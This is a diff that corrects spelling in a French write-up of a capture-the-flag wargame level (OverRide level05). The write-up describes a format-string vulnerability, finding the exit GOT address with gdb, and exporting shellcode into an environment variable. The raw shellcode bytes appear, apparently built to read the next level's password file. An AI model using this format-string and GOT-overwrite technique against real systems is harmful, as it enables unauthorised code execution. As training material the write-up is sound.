@@ -17,14 +17,14 @@ scp -P 4242 $level@192.168.1.28:/home/users/$level/$level ./bin/.
 
 on voit un possible format string vuln printf(s);
 
-le programme rend les majuscule minuscule.
+le programme transforme les majuscules en minuscules.
 
 le buffer fait 100octets et il n'est pas possible de l'overflow
   char s[100]; // [esp+28h] [ebp-70h] BYREF
   fgets(s, 100, stdin);
 
-le programme finit par un "exit(0)" donc je peux ecraser l'adresse de exit 
-Pour ca on vas la chercher:
+le programme finit par un "exit(0)" donc je peux écraser l'adresse de exit 
+Pour ça on va la chercher:
 
 level05@OverRide:~$ gdb ./level05
 (gdb) disassemble main 
@@ -41,7 +41,7 @@ End of assembler dump.
 0x80497e0 <exit@got.plt>:       0x08048376
 (gdb)
 
-l'adresse qui est stocker dans 0x80497e0 renvoie ver exit
+l'adresse qui est stockée dans 0x80497e0 renvoie vers exit
 
 
 donc il faut remplacer la valeur dans 0x80497e0 par une env var qui contient le shellcode
@@ -62,8 +62,8 @@ level05@OverRide:~$
 on retombe sur nos "aaaa" ici 0x61616161 en 10eme position
 
 level05@OverRide:/tmp$ nano get_env.c
-level05@OverRide:/tmp$ nano shell_gen.py
-level05@OverRide:/tmp$ export shellcode=$(python shell_gen.py)
+level05@OverRide:/tmp$ nano shellcode_gen.py
+level05@OverRide:/tmp$ export shellcode=$(python shellcode_gen.py)
 level05@OverRide:/tmp$ env | grep shell
 shellcode=����������������������������������������1�Ph/cath/bin��Phpassh///.hl06/hlevehers/he/ush/hom��PQS��1���
           1�̀
